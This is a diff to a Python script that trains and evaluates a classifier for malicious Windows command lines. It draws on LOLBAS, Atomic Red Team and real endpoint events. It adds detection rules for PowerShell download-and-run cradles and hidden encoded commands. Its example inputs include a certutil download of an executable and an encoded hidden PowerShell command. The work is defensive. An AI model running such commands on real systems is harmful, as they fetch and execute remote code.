@@ -62,6 +62,7 @@ DATASETS = Path(__file__).resolve().parents[7] / "datasets"
 LOLBAS_DIR = DATASETS / "public" / "lolbas" / "yml"
 ATOMIC_DIR = DATASETS / "public" / "atomic-red-team" / "atomics"
 ENDPOINT_CSV = DATASETS / "endpoint-8.csv.gz"
+CAPTURE2_CSV = DATASETS / "dataset.csv.gz"  # a second, larger capture of real events
 COMMANDS_CSV = DATASETS / "commands.csv"
 MODEL_PATH = _BACKEND / "ml_models" / "command_model.joblib"
 REPORTS = _BACKEND / "ml_reports" / "commands"
@@ -88,8 +89,25 @@ _PATH = re.compile(r"[a-z]:\\[^\s'\"<>|]*", re.I)
 _IP = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")
 
 
+_ESCAPED = re.compile(r'^(?:[^\\]|\\\\|\\")*$')
+
+
+def unescape(command: str) -> str:
+    """Wazuh hands a command line over the way it stands in its JSON: every backslash doubled and every quote
+    with a backslash in front ( \\"C:\\\\Windows\\\\certutil.exe\\" -urlcache ). Read like that, the program of a
+    quoted path is not recognised (so no LOLBAS rule matches) and no path looks like a path. A command that is
+    written that way throughout is put back; anything else (a UNC path such as \\\\server\\share) is left alone."""
+    if ("\\\\" in command or '\\"' in command) and _ESCAPED.match(command):
+        return re.sub(r'\\([\\"])', r"\1", command)
+    return command
+
+
 def program_of(command: str) -> str:
     """The program a command runs: 'C:\\Windows\\System32\\certutil.exe -x' -> 'certutil'."""
+    return _program(unescape(command))
+
+
+def _program(command: str) -> str:
     text = command.strip()
     if text.startswith('"'):
         first = text[1:].split('"', 1)[0]
@@ -100,10 +118,10 @@ def program_of(command: str) -> str:
 
 
 def normalize(command: str) -> str:
-    text = " ".join(command.split())
+    text = " ".join(unescape(command).split())
     if not text:
         return ""
-    program = program_of(text)
+    program = _program(text)
     rest = text[len(text.split(None, 1)[0]):] if not text.startswith('"') else text[text.find('"', 1) + 1:]
     text = f"{program} {rest}".strip()
     text = _BLOB.sub("<blob>", text)
@@ -178,6 +196,35 @@ DISCOVERY = {
 }  # fmt: skip
 
 
+# A test of Atomic Red Team is a script, and many of its lines do nothing an attacker needs: they change folder, print a
+# message, wait, make a working folder, open or close a block. Labelled "malicious" one by one (as a first version did),
+# `mkdir c:\temp` and `echo done` are attacks, the classifier is asked to tell them from the same harmless lines, and a
+# test on them measures nothing. Such lines are left out; what stays are the lines that act.
+_SCAFFOLD_WORDS = frozenset((
+    "cd", "chdir", "pushd", "popd", "set-location", "echo", "write-host", "write-output", "write-verbose", "write-warning", "mkdir", "md",
+    "sleep", "start-sleep", "timeout", "pause", "exit", "cls", "clear", "clear-host", "goto", "setlocal", "endlocal", "return",
+    "function", "param", "begin", "process", "end", "dir", "ls", "type", "cat", "get-content", "get-date", "import-module",
+))  # fmt: skip
+_BLOCK_WORDS = ("if", "else", "elseif", "try", "catch", "finally", "foreach", "for", "while", "do", "switch")
+_LITERAL_ASSIGNMENT = re.compile(r"""^\$[\w:]+\s*=\s*(?:"[^"$()]*"|'[^']*'|[\w.\\:/-]+|\$\w+|@\(\)|@\{\})\s*;?$""")
+
+
+def is_scaffolding(line: str) -> bool:
+    """Is this line of a test script only scaffolding (see above)? Judged by how the line starts, nothing else."""
+    text = line.strip()
+    lowered = text.lower()
+    first = re.split(r"[\s({;]", lowered.lstrip("}@ "), maxsplit=1)[0]
+    if not re.search(r"[a-z]", lowered):  # only brackets and punctuation
+        return True
+    if first in _SCAFFOLD_WORDS:
+        return True
+    if first in _BLOCK_WORDS and (lowered.endswith(("{", "}", ")")) or "{" not in lowered):  # opens or closes a block; the lines inside are judged on their own
+        return True
+    if _LITERAL_ASSIGNMENT.match(text):  # $name = "a fixed value"
+        return True
+    return False
+
+
 def read_atomic(folder: Path = ATOMIC_DIR, max_lines: int = 1000) -> list[dict]:
     """The Windows commands of Atomic Red Team's tests, one line each, with the test's
     own default values filled in (Discovery techniques left out, see DISCOVERY)."""
@@ -203,7 +250,7 @@ def read_atomic(folder: Path = ATOMIC_DIR, max_lines: int = 1000) -> list[dict]:
             if "#{" in text:  # a value we cannot know
                 continue
             lines = [ln.strip() for ln in text.splitlines()]
-            lines = [ln for ln in lines if len(ln) >= 10 and not ln.startswith(("#", "REM ", "::", "echo off"))]
+            lines = [ln for ln in lines if len(ln) >= 10 and not ln.startswith(("#", "REM ", "::", "echo off")) and not is_scaffolding(ln)]
             for line in lines[:max_lines]:
                 rows.append({"command": line[:1000], "label": 1, "source": "atomic", "technique": technique,
                              "category": executor["name"], "template": ""})
@@ -324,16 +371,25 @@ def read_benign(endpoint_csv: Path = ENDPOINT_CSV, rng: random.Random | None = N
     """Benign commands: the real command lines of our test endpoint, and made-up everyday ones."""
     rng = rng or random.Random(SEED)
     rows, seen = [], set()
-    if endpoint_csv.exists():
+
+    def real(path: Path, user_source: str, system_source: str, endpoint_id: int | None = None) -> None:
+        """Every different command line a real computer started (Windows event 4688): what a person ran, and what
+        Windows, its services and the updaters of ordinary software ran. The second kind was left out at first, and
+        the classifier then called two thirds of it malicious: nothing it had learned from looked like `svchost -k`."""
         from app.services.ml.data import load_csv
         from app.services.ml.model import is_user_action
 
-        for r in load_csv(str(endpoint_csv), endpoint_id=8, user_actions_only=True):
-            command = (r.get("command_line") or "").strip()
-            # only what a person ran: not Windows services, updates or our own installer
-            if r["windows_event_id"] == "4688" and is_user_action(r) and len(command) >= 6 and command not in seen:
+        for r in load_csv(str(path), endpoint_id=endpoint_id, user_actions_only=False):
+            command = unescape((r.get("command_line") or "").strip())
+            if r.get("windows_event_id") == "4688" and len(command) >= 6 and command not in seen:
                 seen.add(command)
-                rows.append({"command": command[:1000], "label": 0, "source": "endpoint", "technique": "", "category": "", "template": ""})
+                source = user_source if is_user_action(r) else system_source
+                rows.append({"command": command[:1000], "label": 0, "source": source, "technique": "", "category": "", "template": ""})
+
+    if endpoint_csv.exists():
+        real(endpoint_csv, "endpoint", "endpoint-system", endpoint_id=8)
+    if CAPTURE2_CSV.exists():  # a second capture: kept out of the learning part in test 3 (see run_tests)
+        real(CAPTURE2_CSV, "capture-2", "capture-2")
     files = ["C:\\Users\\Public\\report.pdf", "C:\\Users\\alice\\Documents\\notes.txt", "D:\\data\\file.bin", "C:\\Temp\\x.dll"]
     hosts = ["example.com", "intranet.local", "10.0.0.5", "fileserver"]
     for line in _BENIGN:
@@ -345,7 +401,16 @@ def read_benign(endpoint_csv: Path = ENDPOINT_CSV, rng: random.Random | None = N
 
 
 def build_dataset(path: Path = COMMANDS_CSV) -> list[dict]:
-    rows = read_lolbas() + read_atomic() + read_benign()
+    attacks = read_lolbas()
+    rules = Rules(attacks)
+    benign = read_benign()
+    # The test computers are also where attacks were tried out by hand: a real command that a rule recognises
+    # as an attack technique (certutil -urlcache ...) must not be learned as benign.
+    real = ("endpoint", "endpoint-system", "capture-2")
+    kept = [r for r in benign if not (r["source"] in real and rules.match(r["command"]))]
+    if len(kept) != len(benign):
+        print(f"{len(benign) - len(kept)} real command(s) left out of the benign set: a rule recognises them as an attack technique.")
+    rows = attacks + read_atomic() + kept
     seen, unique = set(), []
     for r in rows:  # the same command text with the same label counts once
         key = (r["command"], r["label"])
@@ -373,6 +438,25 @@ def load_dataset(path: Path = COMMANDS_CSV) -> list[dict]:
 # ============================================================================
 
 
+# Rules of our own, for attacks that are common and that the LOLBAS entries do not spell out as one command. Each needs
+# two things at once, so that ordinary software and administration tools do not match: a PowerShell that downloads and runs
+# text is the classic cradle; -EncodedCommand alone is what Intune and installers use, but together with a hidden window it is
+# not; bitsadmin /transfer from a web address downloads a file. They count as a known technique (confirmed), unlike the classifier.
+_EXTRA_RULES = (
+    (("powershell", "pwsh"), ("iex", "invoke-expression"), ("downloadstring", "downloadfile", "net.webclient", "invoke-webrequest", "iwr "), "T1059.001", "Download and run"),
+    (("powershell", "pwsh"), ("-w hidden", "-windowstyle hidden", "-win hidden"), ("-enc ", "-e ", "-encodedcommand "), "T1059.001", "Hidden encoded command"),
+    (("bitsadmin",), ("/transfer",), ("http://", "https://"), "T1197", "Download"),
+)
+
+
+def _extra_rule(program: str, command: str) -> dict | None:
+    text = " " + command.lower() + " "
+    for programs, first, second, technique, category in _EXTRA_RULES:
+        if program in programs and any(w in text for w in first) and any(w in text for w in second):
+            return {"technique": technique, "category": category, "entry": "(rule of our own)"}
+    return None
+
+
 class Rules:
     """Matches a command to a LOLBAS entry: same program, and every switch of the entry present.
     `certutil -urlcache -f <url> <file>` matches the download entry; `certutil -hashfile` matches nothing."""
@@ -393,7 +477,11 @@ class Rules:
         self.entries = sum(len(v) for v in self._by_program.values())
 
     def match(self, command: str) -> dict | None:
-        program = program_of(command)
+        command = unescape(command)
+        program = _program(command)
+        extra = _extra_rule(program, command)
+        if extra is not None:  # a rule of our own, for attacks that the LOLBAS list does not spell out as one entry
+            return extra
         words = command.replace("\\", "/").lower().split()[1:]
         best = None
         for switches, row in self._by_program.get(program, []):
@@ -413,7 +501,8 @@ def make_pipeline() -> Pipeline:
         ("chars", TfidfVectorizer(analyzer="char_wb", ngram_range=(2, 5), min_df=2, sublinear_tf=True)),
         ("words", TfidfVectorizer(token_pattern=r"[^\s]+", ngram_range=(1, 2), min_df=2, sublinear_tf=True)),
     ])
-    return Pipeline([("tfidf", features), ("clf", LogisticRegression(C=10, max_iter=3000, class_weight="balanced"))])
+    # C=3: chosen on the unseen-technique and cross-source tests (10 fitted the learning commands more closely and generalised a little worse)
+    return Pipeline([("tfidf", features), ("clf", LogisticRegression(C=3, max_iter=3000, class_weight="balanced"))])
 
 
 def fit_pipeline(commands: list[str], labels, desc: str = "Training") -> Pipeline:
@@ -480,7 +569,7 @@ def load(path: Path = MODEL_PATH) -> CommandModel:
 # ============================================================================
 
 
-def show(title: str, y: np.ndarray, flagged: np.ndarray, prob: np.ndarray | None = None) -> None:
+def show(title: str, y: np.ndarray, flagged: np.ndarray, prob: np.ndarray | None = None, names: tuple[str, str] = ("benign", "malicious")) -> None:
     """The report every scikit-learn tutorial prints: accuracy, the per-class table of
     precision / recall / f1-score / support, the confusion matrix and the ROC AUC."""
     flagged = np.asarray(flagged).astype(int)
@@ -488,8 +577,8 @@ def show(title: str, y: np.ndarray, flagged: np.ndarray, prob: np.ndarray | None
     print(f"\n{title}")
     print(f"Accuracy: {accuracy_score(y, flagged):.4f}")
     print()
-    print(classification_report(y, flagged, labels=[0, 1], target_names=["benign", "malicious"], digits=4, zero_division=0))
-    print("Confusion matrix:  (rows = actual benign, malicious; columns = predicted benign, malicious)")
+    print(classification_report(y, flagged, labels=[0, 1], target_names=list(names), digits=4, zero_division=0))
+    print(f"Confusion matrix:  (rows = actual {names[0]}, {names[1]}; columns = predicted {names[0]}, {names[1]})")
     print(confusion_matrix(y, flagged, labels=[0, 1]))
     print(f"False-positive rate: {fp / max(fp + tn, 1):.4f}")
     if prob is not None and len(set(y)) == 2:
@@ -532,7 +621,7 @@ def run_tests(rows: list[dict], charts: bool = True, show_windows: bool = False)
     ml_flag = prob >= THRESHOLD
     show("--- Test 1: random 80/20 split, classifier alone ---", y[idx_test], ml_flag, prob)
     # the benign commands that matter most are the real ones: how many of those are called malicious?
-    for source in ("endpoint", "synthetic-benign"):
+    for source in ("endpoint", "endpoint-system", "capture-2", "synthetic-benign"):
         at = [k for k, r in enumerate(test_rows) if r["source"] == source]
         if at:
             print(f"False alarms among the {len(at)} benign test commands from '{source}': {int(ml_flag[at].sum())} ({ml_flag[at].mean():.1%})")
@@ -564,6 +653,59 @@ def run_tests(rows: list[dict], charts: bool = True, show_windows: bool = False)
         show("--- Test 2: rules alone ---", y2, rule2)
         show("--- Test 2: rules + classifier ---", y2, rule2 | ml2, np.maximum(prob2, rule2.astype(float)))
 
+    # --- 2b. the same the other way round: learn from Atomic Red Team, test on LOLBAS
+    summary = {}
+    if lolbas and atomic:
+        summary["2. learn LOLBAS, test Atomic Red Team"] = (y2, prob2)
+        train2b, test2b = atomic + b_train, lolbas + b_test
+        y2b = np.array([r["label"] for r in test2b])
+        p2b = fit_pipeline([r["command"] for r in train2b], [r["label"] for r in train2b], "Training (test 2b)")
+        prob2b = CommandModel(p2b, None).probability([r["command"] for r in test2b])
+        show("--- Test 2b: the other way round (learn Atomic Red Team, test LOLBAS), classifier alone ---", y2b, prob2b >= THRESHOLD, prob2b)
+        summary["2b. learn Atomic Red Team, test LOLBAS"] = (y2b, prob2b)
+
+    # --- 4. unseen techniques: every ATT&CK technique, with all its commands from both sources, is in the test part exactly once
+    from sklearn.model_selection import GroupKFold
+
+    malicious = [r for r in rows if r["label"] == 1]
+    techniques = [(r["technique"] or "none").split(".")[0] for r in malicious]
+    if len(set(techniques)) >= 5:
+        benign_groups = [normalize(r["command"]) for r in benign]
+        ys, ps = [], []
+        folds = zip(GroupKFold(5).split(malicious, groups=techniques), GroupKFold(5).split(benign, groups=benign_groups))
+        for (m_learn, m_test), (b_learn, b_held) in bar(list(folds), "Training (test 4, 5 folds)"):
+            learn = [malicious[i] for i in m_learn] + [benign[i] for i in b_learn]
+            test4 = [malicious[i] for i in m_test] + [benign[i] for i in b_held]
+            pipe4 = make_pipeline().fit([normalize(r["command"]) for r in learn], [r["label"] for r in learn])
+            ps.append(pipe4.predict_proba([normalize(r["command"]) for r in test4])[:, 1])
+            ys.append(np.array([r["label"] for r in test4]))
+        y4, prob4 = np.concatenate(ys), np.concatenate(ps)
+        print("\n" + "=" * 70)
+        print(f"Test 4: unseen techniques. {len(set(techniques))} ATT&CK techniques in 5 folds: the model is tested on techniques of which it")
+        print("has not seen a single command (from either source), and on benign commands it has not seen.")
+        print("=" * 70)
+        show("--- Test 4: classifier alone, the 5 test parts together ---", y4, prob4 >= THRESHOLD, prob4)
+        summary["4. unseen ATT&CK techniques (5 folds)"] = (y4, prob4)
+
+    # --- 3. real commands of a capture the model did not learn from: how many does it call malicious?
+    real_test = None
+    held = [r for r in rows if r["source"] == "capture-2"]
+    if held:
+        rest = [r for r in rows if r["source"] != "capture-2"]
+        known = {normalize(r["command"]) for r in rest}
+        new = [r for r in held if normalize(r["command"]) not in known]
+        print("\n" + "=" * 70)
+        print(f"Test 3: real commands. {len(held)} command lines of a second capture of real events (all benign); {len(new)} of them are")
+        print("not, even with paths removed, among the commands the model learns from here. Share called malicious:")
+        print("=" * 70)
+        real_test = {}
+        for label, learn in (("learning without any real system command", [r for r in rest if r["source"] != "endpoint-system"]), ("learning with those of the first computer", rest)):
+            p3 = fit_pipeline([r["command"] for r in learn], [r["label"] for r in learn], "Training (test 3)")
+            prob3 = CommandModel(p3, None).probability([r["command"] for r in new])
+            real_test[label] = (float((prob3 >= THRESHOLD).mean()), float((prob3 >= 0.8).mean()))
+            print(f"  {label:<44} >= {THRESHOLD}: {real_test[label][0]:6.1%}    >= 0.8: {real_test[label][1]:6.1%}")
+        print("  (the final model also learns from the second capture)")
+
     # --- what the classifier learned
     names = np.array(pipeline.named_steps["tfidf"].get_feature_names_out())
     coef = pipeline.named_steps["clf"].coef_[0]
@@ -582,14 +724,27 @@ def run_tests(rows: list[dict], charts: bool = True, show_windows: bool = False)
         }  # fmt: skip
         if lolbas and atomic:
             results.update({"y2": y2, "prob2": prob2, "flag2": ml2, "test2": test2})
+        results["real_test"] = real_test
         draw_charts(results, show_windows)
+
+    print("\n" + "=" * 70)
+    print("SUMMARY: the classifier alone, tested four ways (read them together)")
+    print("=" * 70)
+    print(f"  {'test':<44} {'accuracy':>9} {'attacks caught':>15} {'benign flagged':>15} {'AUC':>7}")
+    for name, (ya, pa) in [("1. random 80/20 split (near-copies kept apart)", (y[idx_test], prob))] + list(summary.items()):
+        hit = pa >= THRESHOLD
+        print(f"  {name:<44} {accuracy_score(ya, hit):>9.1%} {hit[ya == 1].mean():>15.1%} {hit[ya == 0].mean():>15.1%} {roc_auc_score(ya, pa):>7.3f}")
+    if real_test:
+        print(f"  3. real commands not learned from: called malicious {list(real_test.values())[-1][0]:.1%} (without real system commands in the learning part: {list(real_test.values())[0][0]:.1%})")
+    print("  Tests 2 and 2b learn the attacks of ONE project only and are tested on the other: a stress test of how far one source carries.")
+    print("  Test 4 is the closer picture of use: the model has learned from both projects and meets a technique it has no example of.")
 
     # the model the backend will use learns from everything
     return CommandModel(fit_pipeline([r["command"] for r in rows], y, "Training final model"), Rules(rows))
 
 
 def draw_charts(r: dict, show_windows: bool = False) -> None:
-    """Seven charts, saved to ml_reports/commands/ (and opened in windows with --show)."""
+    """Eight charts, saved to ml_reports/commands/ (and opened in windows with --show)."""
     import matplotlib
 
     if not show_windows:
@@ -693,6 +848,22 @@ def draw_charts(r: dict, show_windows: bool = False) -> None:
         ax.set_title("Recall by ATT&CK technique (the 20 with most commands)")
         done(fig, "7_recall_by_technique.png")
 
+    # 8. real benign commands the model did not learn from: false alarms, without and with real system commands in the learning part
+    if r.get("real_test"):
+        labels = list(r["real_test"])
+        fig, ax = plt.subplots(figsize=(7, 3.6))
+        width = 0.35
+        for k, (name, colour) in enumerate(((f"flagged (>= {THRESHOLD})", ORANGE), ("flagged (>= 0.8)", BLUE))):
+            values = [r["real_test"][label][k] * 100 for label in labels]
+            bars = ax.bar([i + (k - 0.5) * width for i in range(len(labels))], values, width, color=colour, label=name)
+            for b, v in zip(bars, values):
+                ax.text(b.get_x() + b.get_width() / 2, v + 1, f"{v:.1f}%", ha="center", fontsize=9)
+        ax.set_xticks(range(len(labels)), labels, fontsize=9)
+        ax.set_ylabel("real benign commands called malicious (%)")
+        ax.set_title("Test 3: real commands of a capture not learned from")
+        ax.legend()
+        done(fig, "8_real_commands_false_alarms.png")
+
     print(f"\nCharts saved to {REPORTS}")
     for name in saved:
         print(f"  {name}")
@@ -733,6 +904,11 @@ def main() -> None:
         "certutil -urlcache -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe",
         "whoami",
         "powershell -nop -w hidden -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" * 2,
+        r'"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua /installsource scheduler',
+        r"C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule",
+        r'"C:\Users\x\Downloads\ChromeSetup.exe" --install',
+        # the same attack the way Wazuh hands it over (backslashes doubled, quotes escaped): the rule must still match
+        r'\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe',
     ]:
         r = model.check(example)
         print(f"{'MALICIOUS' if r['malicious'] else 'benign':<11} {r['probability']:>11.4f}  {r['technique'] or '-':<12} {example[:80]}")
